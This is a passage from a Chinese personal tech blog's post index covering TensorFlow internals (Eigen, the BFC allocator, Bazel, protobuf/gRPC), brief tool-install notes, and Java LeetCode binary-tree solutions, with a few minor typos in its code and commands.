由于Eigen默认采用惰性计算，如果要求表达式的值可以使用Tensor::eval()函数。Tensor::eval()函数也是session.run()的底层运算。例如： Tensor result = ((t1 + t2).eval() * 0.2f).exp() 3.2.4 Eigen 编译加速编译加速可以充分发挥计算机的并行计算能力，提高程序运行速度。 举例如下： 普通的循环相加运算时间复杂度是$O(n)$： 12for (int i=0; i&lt; size; i++) u[i] = v[i] + w[i]; 如果指令集支持128bit并行计算，则时间复杂度可缩短为$O(n/4)$： 12for (int i=0; i&lt; 4*(size/4); i+=4) u.packet(i) = v.packet(i) + w.packet(i); Eigen编译时使用了SSE2加速。假设处理float32类型，指令集支持128bit并行计算，则一次可以计算4个float32类型，速度提升4倍。 3.2.5 Eigen::halfTensorflow支持的浮点数类型有float16, float32, float64，其中float16本质上是Eigen::half类型，即半精度浮点数。关于半精度浮点数，英伟达2002年首次提出使用半精度浮点数达到降低数据传输和存储成本的目的。 在分布式计算中，如果对数据精度要求不那么高，可以将传输数据转换为float16类型，这样可以大大缩短设备间的数据传输时间。在GPU运算中，float16还可以减少一般的内存占用。 在Tensorflow的分布式传输中，默认会将float32转换为float16类型。Tensorflow的转换方式不同于Nvidia的标准，采用直接截断尾数的方式转化为半精度浮点数，以减少转换时间。 浮点数存储格式分成3部分，符号位，指数和尾数。不同精度是指数位和尾数位的长度不一样。 3.3 设备内存管理TF设备内存管理模块利用BFC算法（best-fit with coalescing）实现。BFC算法是Doung Lea’s malloc(dlmalloc)的一个非常简单的版本。它具有内存分配、释放、碎片管理等基本功能。 BFC将内存分成一系列内存块，每个内存块由一个chunk数据结构管理。从chunk结构中可以获取到内存块的使用状态、大小、数据的基址、前驱和后继chunk等信息。整个内存可以通过一个chunk的双链表结构来表示。 用户申请一个内存块（malloc）。根据建立的chunk双链表找到一个合适的内存块（后面会说明什么是合适的内存块），如果该内存块的大小是用户申请大小的两倍以上，那么将该内存块切分成两块，这就是split操作。返回其中一块给用户，并将该内存块标识为占用。Spilt操作会新增一个chunk，所以需要修改chunk双链表以维持前驱和后继关系。 用户释放一个内存块（free）。先将该块标记为空闲。然后根据chunk数据结构中的信息找到其前驱和后继内存块。如果前驱和后继块中有空闲的块，那么将刚释放的块和空闲的块合并成一个更大的chunk（这就是merge操作，合并当前块和其前后的空闲块）。再修改双链表结构以维持前驱后继关系。这就做到了内存碎片的回收。 BFC的核心思想是：将内存分块管理，按块进行空间分配和释放；通过split操作将大内存块分解成小内存块；通过merge操作合并小的内存块，做到内存碎片回收。 但是还留下许多疑问。比如说申请内存空间时，什么样的块算合适的内存块？如何快速管理这种块？ BFC算法采取的是被动分块的策略。最开始整个内存是一个chunk，随着用户申请空间的次数增加，最开始的大chunk会被不断的split开来，从而产生越来越多的小chunk。当chunk数量很大时，为了寻找一个合适的内存块而遍历双链表无疑是一笔巨大的开销。为了实现对空闲块的高效管理，BFC算法设计了bin这个抽象数据结构。 Bin数据结构中，每个bin都有一个size属性，一个bin是一个拥有chunk size &gt;= bin size的空闲chunk的集合。集合中的chunk按照chunk size的升序组织成单链表。BFC算法维护了一个bin的集合：bins。它由多个bin以及从属于每个bin的chunks组成。内存中所有的空闲chunk都由bins管理。 图 3-12中每一列表示一个bin，列首方格中的数字表示bin的size。bin size的大小都是256的$2^n$的倍。每个bin下面挂载了一系列的空闲chunk，每个chunk的chunk size都大于等于所属的bin的bin size，按照chunk size的升序挂载成单链表。BFC算法针对bins这个集合设计了三个操作：search、insert、delete。 Search 操作：给定一个chunk size，从bins中找到大于等于该chunk size的最小的那个空闲chunk。Search操作具体流程如下。如果bin以数组的形式组织，那么可以从index = chunk size /256 &gt;&gt;2的那个bin开始查找。最好的情况是开始查找的那个bin的chunk链表非空，那么直接返回链表头即可。这种情况时间复杂度是常数级的。最坏的情况是遍历bins数组中所有的bin。对于一般大小的内存来说，bins数组元素非常少，比如4G空间只需要23个bin就足够了（256 * 2 ^ 23 &gt; 4G），因此也很快能返回结果。总体来说search操作是非常高效的。对于固定大小内存来说，查找时间是常数量级的。 Insert 操作：将一个空闲的chunk插入到一个bin所挂载的chunk链表中，同时需要维持chunk链表的升序关系。具体流程是直接将chunk插入到index = chunk size /256 &gt;&gt;2的那个bin中即可。 Delete操作：将一个空闲的chunk从bins中移除。 TF中内存分配算法实现文件core/common_runtime/bfc_allocator.cc，GPU内存分配算法实现文件core/common_runtime/gpu/gpu_bfc_allocator.cc。 3.4 TF开发工具介绍TF系统开发使用了bazel工具实现工程代码自动化管理，使用了protobuf实现了跨设备数据传输，使用了swig库实现python接口封装。本章将从这三方面介绍TF开发工具的使用。 3.4.1 Swig封装Tensorflow核心框架使用C++编写，API接口文件定义在tensorflow/core/public目录下，主要文件是tensor_c_api.h文件，C++语言直接调用这些头文件即可。 Python通过Swig工具封装TF库包间接调用，接口定义文件tensorflow/python/ tensorflow.i。其中swig全称为Simplified Wrapper and Interface Generator，是封装C/C++并与其它各种高级编程语言进行嵌入联接的开发工具，对swig感兴趣的请参考相关文档。 在tensorflow.i文件中包含了若干个.i文件，每个文件是对应模块的封装，其中tf_session.i文件中包含了tensor_c_api.h，实现client向session发送请求创建和运行graph的功能。 3.4.2 Bazel编译和调试Bazel是Google开源的自动化构建工具，类似于Make和CMake工具。Bazel的目标是构建“快速并可靠的代码”，并且能“随着公司的成长持续调整其软件开发实践”。 TF中几乎所有代码编译生成都是依赖Bazel完成的，了解Bazel有助于进一步学习TF代码，尤其是编译测试用例进行gdb调试。 Bazel假定每个目录为[package]单元，目录里面包含了源文件和一个描述文件BUILD，描述文件中指定了如何将源文件转换成构建的输出。 以图 3-13为例，左子图为工程中不同模块间的依赖关系，右子图是对应模块依赖关系的BUILD描述文件。 图 3-13中name属性来命名规则，srcs属性为模块相关源文件列表，deps属性来描述规则之间的依赖关系。”//search: google_search_page”中”search”是包名，”google_search_page”为规则名，其中冒号用来分隔包名和规则名；如果某条规则所依赖的规则在其他目录下，就用”//“开头，如果在同一目录下，可以忽略包名而用冒号开头。 图 3-13中cc_binary表示编译目标是生成可执行文件，cc_library表示编译目标是生成库文件。如果要生成google_search_page规则可运行 1bazel buid -c opt // search: google_search_page 如果要生成可调试的二进制文件，可运行 1bazel buid -c dbg // search: google_search_page TF中首次运行bazel时会自动下载很多依赖包，如果有的包下载失败，打开tensorflow/workspace.bzl查看是哪个包下载失败，更改对应依赖包的new_http_archive中的url地址，也可以把new_http_archive设置为本地目录new_local_repository。 TF中测试用例跟相应代码文件放在一起，如MatMul操作的core/kernels/matmul_op.cc文件对应的测试用例文件为core/kernels/matmul_op_test.cc文件。运行这个测试用例需要查找这个测试用例对应的BUILD文件和对应的命令规则，如matmul_op_test.cc文件对应的BUILD文件为core/kernels/BUILD文件，如下 其中tf_cuda_cc_test函数是TF中自定义的编译函数，函数定义在/tensorflow/ tensorflow.bzl文件中，它会把matmul_op_test.cc放进编译文件中。要生成matmul_op_test可执行文件可运行如下脚本： 3.4.3 Protobuf序列化Protocol Buffers 是一种轻便高效的结构化数据存储格式，可以用于结构化数据串行化，或者说序列化。它很适合做数据存储或 RPC 数据交换格式。可用于通讯协议、数据存储等领域的语言无关、平台无关、可扩展的序列化结构数据格式。 Protobuf对象描述文件为.proto类型，编译后生成.pb.h和.pb.cc文件。 Protobuf主要包含读写两个函数：Writer（序列化）函数SerializeToOstream()和 Reader（反序列化）函数 ParseFromIstream()。 Tensorflow在core/probobuf目录中定义了若干与分布式环境相关的.proto文件，同时在core/framework目录下定义了与基本数据类型和结构的.proto文件，在core/util目录中也定义部分.proto文件，感觉太随意了。 在分布式环境中，不仅需要传输数据序列化，还需要数据传输协议。Protobuf在序列化处理后，由gRPC完成数据传输。gRPC数据传输架构图见图3-14。 gRPC服务包含客户端和服务端。gRPC客户端调用stub 对象将请求用 protobuf 方式序列化成字节流，用于线上传输，到 server端后调用真正的实现对象处理。gRPC的服务端通过observer观察处理返回和关闭通道。 TF使用gRPC完成不同设备间的数据传输，比如超参数、梯度值、graph结构。","tags":[{"name":"tensorflow","slug":"tensorflow","permalink":"http://larryim.cc/tags/tensorflow/"}],"categories":[{"name":"TensorFlow","slug":"TensorFlow","permalink":"http://larryim.cc/categories/TensorFlow/"}]},{"title":"2 TF核心概念","date":"2017-12-29T16:00:00.000Z","path":"2017/12/30/TensorFlow-2-核心概念/","text":"TF的核心是围绕Graph展开的，简而言之，就是Tensor沿着Graph传递闭包完成Flow的过程。所以在介绍Graph之前需要讲述一下符号编程、计算流图、梯度计算、控制流的概念。 2.1 Tensor在数学上，Matrix表示二维线性映射，Tensor表示多维线性映射，Tensor是对Matrix的泛化，可以表示1-dim、2-dim、N-dim的高维空间。图4对比了矩阵乘法（Matrix Product）和张量积（Tensor Contract），可以看出Tensor的泛化能力，其中张量积运算在TF的MatMul和Conv2D运算中都有用到。 Tensor在高维空间数学运算比Matrix计算复杂，计算量也非常大，加速张量并行运算是TF优先考虑的问题，如add, contract, slice, reshape, reduce, shuffle等运算。 TF中Tensor的维数描述为阶，数值是0阶，向量是1阶，矩阵是2阶，以此类推，可以表示n阶高维数据。 TF中Tensor支持的数据类型有很多，如tf.float16, tf.float32, tf.float64, tf.uint8, tf.int8, tf.int16, tf.int32, tf.int64, tf.string, tf.bool, tf.complex64等，所有Tensor运算都使用泛化的数据类型表示。 TF的Tensor定义和运算主要是调用Eigen矩阵计算库完成的。TF中Tensor的UML定义如图4。其中TensorBuffer指针指向Eigen::Tensor类型。其中，Eigen::Tensor[5][6]不属于Eigen官方维护的程序，由贡献者提供文档和维护，所以Tensor定义在Eigen unsupported模块中。 图2-2中，Tensor主要包含两个变量m_data和m_dimension，m_data保存了Tensor的数据块，T是泛化的数据类型，m_dimensions保存了Tensor的维度信息。 Eigen:Tensor的成员变量很简单，却支持非常多的基本运算，再借助`的加速机制实现快速计算，参考章节3.2。Eigen::Tensor`主要包含了 一元运算（Unary），如sqrt、square、exp、abs等。 二元运算（Binary），如add，sub，mul，div等 选择运算（Selection），即if/else条件运算 归纳运算（Reduce），如reduce_sum， reduce_mean等 几何运算（Geometry），如reshape，slice，shuffle，chip，reverse，pad，concatenate，extract_patches，extract_image_patches等 张量积（Contract）和卷积运算（Convolve）是重点运算，后续会详细讲解。 2.2 符号编程编程模式通常分为命令式编程（imperative style programs）和符号式编程（symbolic style programs）。 命令式编程容易理解和调试，命令语句基本没有优化，按原有逻辑执行。符号式编程涉及较多的嵌入和优化，不容易理解和调试，但运行速度有同比提升。 这两种编程模式在实际中都有应用，Torch是典型的命令式风格，caffe、theano、mxnet和Tensorflow都使用了符号式编程。其中caffe、mxnet采用了两种编程模式混合的方法，而Tensorflow是完全采用了符号式编程，Theano和Tensorflow的编程模式更相近。 命令式编程是常见的编程模式，编程语言如python/C++都采用命令式编程。命令式编程明确输入变量，并根据程序逻辑逐步运算，这种模式非常在调试程序时进行单步跟踪，分析中间变量。举例来说，设A=10, B=10，计算逻辑： C=A*B D=C+1 第一步计算得出C=100，第二步计算得出D=101，输出结果D=101。 符号式编程将计算过程抽象为计算图，计算流图可以方便的描述计算过程，所有输入节点、运算节点、输出节点均符号化处理。计算图通过建立输入节点到输出节点的传递闭包，从输入节点出发，沿着传递闭包完成数值计算和数据流动，直到达到输出节点。这个过程经过计算图优化，以数据（计算）流方式完成，节省内存空间使用，计算速度快，但不适合程序调试，通常不用于编程语言中。举上面的例子，先根据计算逻辑编写符号式程序并生成计算图 其中A和B是输入符号变量，C和D是运算符号变量，compile函数生成计算图F，如图2-3所示。 最后得到A=10, B=10时变量D的值，这里D可以复用C的内存空间，省去了中间变量的空间存储。 `D=F(A=10, B=10) 图2-4是TF中的计算流图，C=F(Relu(Add(MatMul(W, x), b)))，其中每个节点都是符号化表示的。通过session创建graph，在调用session.run执行计算。 和目前的符号语言比起来，TF最大的特点是强化了数据流图，引入了mutation的概念。这一点是TF和包括Theano在内的符号编程框架最大的不同。所谓mutation，就是可以在计算的过程更改一个变量的值，而这个变量在计算的过程中会被带入到下一轮迭代里面去。 Mutation是机器学习优化算法几乎必须要引入的东西（虽然也可以通过immutable replacement来代替，但是会有效率的问题）。 Theano的做法是引入了update statement来处理mutation。TF选择了纯符号计算的路线，并且直接把更新引入了数据流图中去。从目前的白皮书看还会支持条件和循环。这样就几乎让TF本身成为一门独立的语言。不过这一点会导致最后的API设计和使用需要特别小心，把mutation 引入到数据流图中会带来一些新的问题，比如如何处理写与写之间的依赖。 2.3 梯度计算梯度计算主要应用在误差反向传播和数据更新，是深度学习平台要解决的核心问题。梯度计算涉及每个计算节点，每个自定义的前向计算图都包含一个隐式的反向计算图。从数据流向上看，正向计算图是数据从输入节点到输出节点的流向过程，反向计算图是数据从输出节点到输入节点的流向过程。 图2-5是2.2节中图2-3对应的反向计算图。图中，由于C=AB，则dA=BdC, dB=AdC。在反向计算图中，输入节点dD，输出节点dA和dB，计算表达式为dA=BdC=BdD, dB=AdC=A*dD。每一个正向计算节点对应一个隐式梯度计算节点。 反向计算限制了符号编程中内存空间复用的优势，因为在正向计算中的计算数据在反向计算中也可能要用到。从这一点上讲，粗粒度的计算节点比细粒度的计算节点更有优势，而TF大部分为细粒度操作，虽然灵活性很强，但细粒度操作涉及到更多的优化方案，在工程实现上开销较大，不及粗粒度简单直接。在神经网络模型中，TF将逐步侧重粗粒度运算。 2.4 控制流TF的计算图如同数据流一样，数据流向表示计算过程，如图2-6。数据流图可以很好的表达计算过程，为了扩展TF的表达能力，TF中引入控制流。 图2-6 Graph的数据流 在编程语言中，if…else…是最常见的逻辑控制，在TF的数据流中也可以通过这种方式控制数据流向。接口函数如下，pred为判别表达式，fn1和fn2为运算表达式。当pred为true是，执行fn1操作；当pred为false时，执行fn2操作。 tf.cond(pred, fn1, fn2, name=None) TF还可以协调多个数据流，在存在依赖节点的场景下非常有用，例如节点B要读取模型参数θ更新后的值，而节点A负责更新参数θ，则节点B必须等节点A完成后才能执行，否则读取的参数θ为更新前的数值，这时需要一个运算控制器。接口函数如下，tf.control_dependencies函数可以控制多个数据流执行完成后才能执行接下来的操作，通常与tf.group函数结合使用。 tf.control_dependencies(control_inputs) TF支持的控制算子有Switch、Merge、Enter、Leave和NextIteration等。 TF不仅支持逻辑控制，还支持循环控制。TF使用和MIT Token-Tagged machine相似的表示系统，将循环的每次迭代标记为一个tag，迭代的执行状态标记为一个frame，但迭代所需的数据准备好的时候，就可以开始计算，从而多个迭代可以同时执行。","tags":[{"name":"tensorflow","slug":"tensorflow","permalink":"http://larryim.cc/tags/tensorflow/"}],"categories":[{"name":"TensorFlow","slug":"TensorFlow","permalink":"http://larryim.cc/categories/TensorFlow/"}]},{"title":"1 TF系统框架","date":"2017-12-29T16:00:00.000Z","path":"2017/12/30/TensorFlow-1-TF系统框架/","text":"转自 2015年11月9日，Google发布深度学习框架TensorFlow并宣布开源，并迅速得到广泛关注，在图形分类、音频处理、推荐系统和自然语言处理等场景下都被大面积推广。TensorFlow系统更新快速，官方文档教程齐全，上手快速且简单易用，支持Python和C++接口。本文依据对Tensorflow（简称TF）白皮书[1]、TF Github[2]和TF官方教程[3]的理解，从系统和代码实现角度讲解TF的内部实现原理。以Tensorflow r0.8.0为基础，本文由浅入深的阐述Tensor和Flow的概念。先介绍了TensorFlow的核心概念和基本概述，然后剖析了OpKernels模块、Graph模块、Session模块。 1. TF系统框架1.1 TF依赖视图TF的依赖视图如图1所示，描述了TF的上下游关系链。 TF托管在github平台，有google groups和contributors共同维护。 TF提供了丰富的深度学习相关的API，支持Python和C/C++接口。 TF提供了可视化分析工具Tensorboard，方便分析和调整模型。 TF支持Linux平台，Windows平台，Mac平台，甚至手机移动设备等各种平台。 1.2 TF系统架构图1-2是TF的系统架构，从底向上分为设备管理和通信层、数据操作层、图计算层、API接口层、应用层。其中设备管理和通信层、数据操作层、图计算层是TF的核心层。 底层设备通信层负责网络通信和设备管理。设备管理可以实现TF设备异构的特性，支持CPU、GPU、Mobile等不同设备。网络通信依赖gRPC通信协议实现不同设备间的数据传输和更新。 第二层是Tensor的OpKernels实现。这些OpKernels以Tensor为处理对象，依赖网络通信和设备内存分配，实现了各种Tensor操作或计算。Opkernels不仅包含MatMul等计算操作，还包含Queue等非计算操作，这些将在第5章Kernels模块详细介绍。 第三层是图计算层（Graph），包含本地计算流图和分布式计算流图的实现。Graph模块包含Graph的创建、编译、优化和执行等部分，Graph中每个节点都是OpKernels类型表示。关于图计算将在第6章Graph模块详细介绍。 第四层是API接口层。Tensor C API是对TF功能模块的接口封装，便于其他语言平台调用。 第四层以上是应用层。不同编程语言在应用层通过API接口层调用TF核心功能实现相关实验和应用。 1.3 TF代码目录组织图1-3是TF的代码结构视图，下面将简单介绍TF的目录组织结构。 Tensorflow/core目录包含了TF核心模块代码。 public: API接口头文件目录，用于外部接口调用的API定义，主要是session.h 和tensor_c_api.h。 client: API接口实现文件目录。 platform: OS系统相关接口文件，如file system, env等。 protobuf: 均为.proto文件，用于数据传输时的结构序列化. common_runtime: 公共运行库，包含session, executor, threadpool, rendezvous, memory管理, 设备分配算法等。 distributed_runtime: 分布式执行模块，如rpc session, rpc master, rpc worker, graph manager。 framework: 包含基础功能模块，如log, memory, tensor graph: 计算流图相关操作，如construct, partition, optimize, execute等 kernels: 核心Op，如matmul, conv2d, argmax, batch_norm等 lib: 公共基础库，如gif、gtl(google模板库)、hash、histogram等。 ops: 基本ops运算，ops梯度运算，io相关的ops，控制流和数据流操作 Tensorflow/stream_executor目录是并行计算框架，由google stream executor团队开发。 Tensorflow/contrib目录是contributor开发目录。 Tensroflow/python目录是python API客户端脚本。 Tensorflow/tensorboard目录是可视化分析工具，不仅可以模型可视化，还可以监控模型参数变化。 third_party目录是TF第三方依赖库。 eigen3: eigen矩阵运算库，TF基础ops调用 gpus: 封装了cuda/cudnn编程库 1.4 TF – Kernels模块TF中包含大量Op算子，这些算子组成Graph的节点集合。这些算子对Tensor实现相应的运算操作。图1-4列出了TF中的Op算子的分类和举例。","tags":[{"name":"tensorflow","slug":"tensorflow","permalink":"http://larryim.cc/tags/tensorflow/"}],"categories":[{"name":"TensorFlow","slug":"TensorFlow","permalink":"http://larryim.cc/categories/TensorFlow/"}]},{"title":"Nasm","date":"2017-12-10T16:00:00.000Z","path":"2017/12/11/awesome-Install-nasm/","text":"NASM是一款开源的汇编语言编译器，官网地址为http://www.nasm.us. 编译命令1nasm −f &lt;format&gt; &lt;filename&gt; [−o &lt;output&gt;]","tags":[],"categories":[{"name":"awesome Install","slug":"awesome-Install","permalink":"http://larryim.cc/categories/awesome-Install/"}]},{"title":"Octave","date":"2017-12-09T16:00:00.000Z","path":"2017/12/10/awesome-Install-octave/","text":"Octave几乎完全模仿了Matlab的基本功能，其目的是做一个开源的、可扩展的Matlab, 两者相似率在95%以上。所以使用Octave基本不用担心兼容性的问题，而且Octave的开源使其更收到科学计算社区的欢迎。 在Mac上可以直接使用图形界面进行操作，就像Matlab一样。下载链接在Octave for macOS页面上的 download Octave 4.0.3 with graphical user interface 。 软件界面如下，是不是非常像Matlab呢？","tags":[],"categories":[{"name":"awesome Install","slug":"awesome-Install","permalink":"http://larryim.cc/categories/awesome-Install/"}]},{"title":"Intel Parallel Studio XE","date":"2017-12-02T16:00:00.000Z","path":"2017/12/03/awesome-Install-Intel-Parallel-Studio-XE/","text":"Intel Paralle Studio 对于学生是可以免费申请的，点击这里填上你的学校邮箱及相关信息即可。 申请界面如下，点击下面的mac os选项即可。 安装下载软件后，像安装一般软件一样，点击安装一步步往下走即可，在安装过程中需要输入申请到的激活码。 环境配置以最新的2018 Release为例, 安装好以后在.bashrc中加上如下语句： 123#intelsource /opt/intel/compilers_and_libraries_2018.0.104/mac/bin/compilervars.sh intel64source /opt/intel/compilers_and_libraries_2018.0.104/mac/mkl/bin/mklvars.sh intel64 这样即配置好了相关的IFORT编译器以及MKL库。运行ifort命令和-mkl选项测试: 1$ifort fortran_file.f90 -mkl","tags":[{"name":"IFORT","slug":"IFORT","permalink":"http://larryim.cc/tags/IFORT/"}],"categories":[{"name":"awesome Install","slug":"awesome-Install","permalink":"http://larryim.cc/categories/awesome-Install/"}]},{"title":"101. Symmetric Tree","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-101-Symmetric-Tree/","text":"Given a binary tree, check whether it is a mirror of itself (ie, symmetric around its center). For example, this binary tree [1,2,2,3,4,4,3] is symmetric: 12345 1 / \\ 2 2 / \\ / \\3 4 4 3 But the following [1,2,2,null,3,null,3] is not: 12345 1 / \\2 2 \\ \\ 3 3 Note: Bonus points if you could solve it both recursively and iteratively. Java二叉树对称，iff, 左子树和右子树对称。 那么怎么判断两棵树对称？ 两棵树对成，iff 左节点和右节点的值相等 两棵树的左子树和右子树依次对称 1234567891011public boolean isSymmetricSubTree(TreeNode root) &#123; if (root == null) return true; return isSymmetricNodes(root.left, root.right);&#125; private boolean isSymmetricSubTree(TreeNode root1, TreeNode root2) &#123; if (root1 == null || root2 == null) return root1 == root2; return root1.val == root2.val &amp;&amp; isSymmetricSubTree(root1.left, root2.right) &amp;&amp; isSymmetricSubTree(root1.right, root2.left);&#125; isSymmetricSubTree还可以再优化一点, 也就是将根节点看成是子节点，相当于增加了一个虚拟根节点。 123public boolean isSymmetricSubTree(TreeNode root) &#123; return isSymmetricNodes(root, root);&#125; 同样的思路，使用迭代: 12345678910111213141516171819public boolean isSymmetric(TreeNode root) &#123; if (root == null) return true; Stack&lt;TreeNode&gt; stack = new Stack&lt;&gt;(); stack.push(root); stack.push(root); while (!stack.isEmpty()) &#123; TreeNode left = stack.pop(); TreeNode right = stack.pop(); if (left.val != right.val) return false; if (left.left != null &amp;&amp; right.right != null) &#123; stack.push(left.left); stack.push(right.right); &#125; else if (left.left != right.right) return false; if (left.right != null &amp;&amp; right.left != null) &#123; stack.push(left.right); stack.push(right.left); &#125; else if (left.right != right.left) return false; &#125; return true;&#125; 发现使用BFS思路的QUEUE，使用迭代可以简化一些： 1234567891011121314151617public boolean isSymmetric(TreeNode root) &#123; Queue&lt;TreeNode&gt; q = new LinkedList&lt;&gt;(); q.add(root); q.add(root); while (!q.isEmpty()) &#123; TreeNode t1 = q.poll(); TreeNode t2 = q.poll(); if (t1 == null &amp;&amp; t2 == null) continue; if (t1 == null || t2 == null) return false; if (t1.val != t2.val) return false; q.add(t1.left); q.add(t2.right); q.add(t1.right); q.add(t2.left); &#125; return true;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"},{"name":"Breadth-first Search","slug":"Breadth-first-Search","permalink":"http://larryim.cc/tags/Breadth-first-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"102. Binary Tree Level Order Traversal","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-102-Binary-Tree-Level-Order-Traversal/","text":"Given a binary tree, return the level order traversal of its nodes’ values. (ie, from left to right, level by level). For example: Given binary tree [3,9,20,null,null,15,7],12345 3 / \\9 20 / \\ 15 7 return its level order traversal as: 12345[ [3], [9,20], [15,7]] Java这道题目要求的层序遍历。题目这么长，其实想让我们写广度优先搜索。 123456789101112131415161718public List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root) &#123; List&lt;List&lt;Integer&gt;&gt; levels = new ArrayList&lt;List&lt;Integer&gt;&gt;(); if (root == null) return levels; Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;(); queue.offer(root); while (!queue.isEmpty()) &#123; List&lt;Integer&gt; curLevel = new ArrayList&lt;&gt;(); int size = queue.size(); for (int i = 0; i &lt; size; i++) &#123; TreeNode node = queue.poll(); if (node.left != null) queue.offer(node.left); if (node.right != null) queue.offer(node.right); curLevel.add(node.val); &#125; levels.add(curLevel); &#125; return levels; &#125; 不过也可以用深度优先搜索写 123456789101112131415public List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root) &#123; List&lt;List&lt;Integer&gt;&gt; res = new ArrayList&lt;List&lt;Integer&gt;&gt;(); levelHelper(res, root, 0); return res;&#125; public void levelHelper(List&lt;List&lt;Integer&gt;&gt; res, TreeNode root, int height) &#123; if (root == null) return; if (height == res.size()) &#123; res.add(new LinkedList&lt;Integer&gt;()); &#125; res.get(height).add(root.val); levelHelper(res, root.left, height+1); levelHelper(res, root.right, height+1);&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Breath-first Search","slug":"Breath-first-Search","permalink":"http://larryim.cc/tags/Breath-first-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"104. Maximum Depth of Binary Tree","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-104-Maximum-Depth-of-Binary-Tree/","text":"Given a binary tree, find its maximum depth. The maximum depth is the number of nodes along the longest path from the root node down to the farthest leaf node. Note: A leaf is a node with no children. Example: 1234567Given binary tree [3,9,20,null,null,15,7], 3 / \\ 9 20 / \\ 15 7 Java123456public int maxDepth(TreeNode root) &#123; if (root == null) return 0; int left = maxDepth(root.left); int right = maxDepth(root.right); return Math.max(left, right) + 1; &#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Depth-first Search","slug":"Depth-first-Search","permalink":"http://larryim.cc/tags/Depth-first-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"103. Binary Tree Zigzag Level Order Traversal","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-103-Binary-Tree-Zigzag-Level-Order-Traversal/","text":"Given a binary tree, return the zigzag level order traversal of its nodes’ values. (ie, from left to right, then right to left for the next level and alternate between). For example:Given binary tree [3,9,20,null,null,15,7], 12345 3 / \\9 20 / \\ 15 7 return its zigzag level order traversal as: 12345[ [3], [20,9], [15,7]] Java这道题目是LeetCode 102. Binary Tree Level Order Traversal的变形，其实增加一个判断即可，如果是从左往右，那么直接添加；如果是从右往左，那么先反转再添加。 12345678910111213141516171819202122232425262728public List&lt;List&lt;Integer&gt;&gt; zigzagLevelOrder(TreeNode root) &#123; List&lt;List&lt;Integer&gt;&gt; zigzag = new ArrayList&lt;&gt;(); if (root == null) return zigzag; boolean isLeftToRight = true; Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;(); queue.add(root); while(!queue.isEmpty()) &#123; int size = queue.size(); List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; size; i++) &#123; TreeNode node = queue.poll(); list.add(node.val); if (node.left != null) queue.offer(node.left); if (node.right != null) queue.offer(node.right); &#125; if (isLeftToRight)&#123; zigzag.add(list); isLeftToRight = false; &#125; else &#123; Collections.reverse(list); zigzag.add(list); isLeftToRight = true; &#125; &#125; return zigzag;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Tree","slug":"Tree","permalink":"http://larryim.cc/tags/Tree/"},{"name":"Breath-first Search","slug":"Breath-first-Search","permalink":"http://larryim.cc/tags/Breath-first-Search/"},{"name":"Stack","slug":"Stack","permalink":"http://larryim.cc/tags/Stack/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"105. Construct Binary Tree from Preorder and Inorder Traversal","date":"2017-10-29T16:00:00.000Z","path":"2017/10/30/Leetcode-105-Construct-Binary-Tree-from-Preorder-and-Inorder-Traversal/","text":"Given preorder and inorder traversal of a tree, construct the binary tree. Note:You may assume that duplicates do not exist in the tree. For example, given 12preorder = [3,9,20,15,7]inorder = [9,3,15,20,7] Return the following binary tree: 12345 3 / \\9 20 / \\ 15 7 Java分析来源于这里。 1 / \\ 2 3 / \\ / \\ 4 5 6 7 对于上图的树来说， index: 0 1 2 3 4 5 6 先序遍历为: 1 2 4 5 3 6 7 中序遍历为: 4 2 5 1 6 3 7 红色是根节点，蓝色为左子树，绿色为右子树。可以发现的规律是： 先序遍历的从左数第一个为整棵树的根节点。 中序遍历中根节点是左子树右子树的分割点。 再看这个树的左子树： 先序遍历为: 2 4 5 中序遍历为: 4 2 5 依然可以套用上面发现的规律。再看这个树的右子树： 先序遍历为: 3 6 7 中序遍历为: 6 3 7 也是可以套用上面的规律的。 所以这道题可以用递归的方法解决。 具体解决方法是： 通过先序遍历找到第一个点作为根节点，在中序遍历中找到根节点并记录index。 因为中序遍历中根节点左边为左子树，所以可以记录左子树的长度并在先序遍历中依据这个长度找到左子树的区间，用同样方法可以找到右子树的区间。 递归的建立左子树和右子树。 代码如下： 123456789101112131415161718192021222324public TreeNode buildTree(int[] preorder, int[] inorder) &#123; if (preorder.length == 0) return null; if (preorder.length == 1) return new TreeNode(preorder[0]); // 通过先序遍历找到根节点 int rootVal = preorder[0]; // 在中序遍历中找到根节点并记录index int rootIndex = search(inorder, rootVal); // 建立根节点 TreeNode root = new TreeNode(rootVal); // 建立左子树 root.left = buildTree(Arrays.copyOfRange(preorder, 1, 1 + rootIndex), Arrays.copyOfRange(inorder, 0, rootIndex)); //建立右子树 root.right = buildTree(Arrays.copyOfRange(preorder, 1 + rootIndex, preorder.length), Arrays.copyOfRange(inorder, 1 + rootIndex, inorder.length)); return root;&#125;private int search(int[] inorder, int val) &#123; for (int i = 0; i &lt; inorder.length; i++) &#123; if (inorder[i] == val) 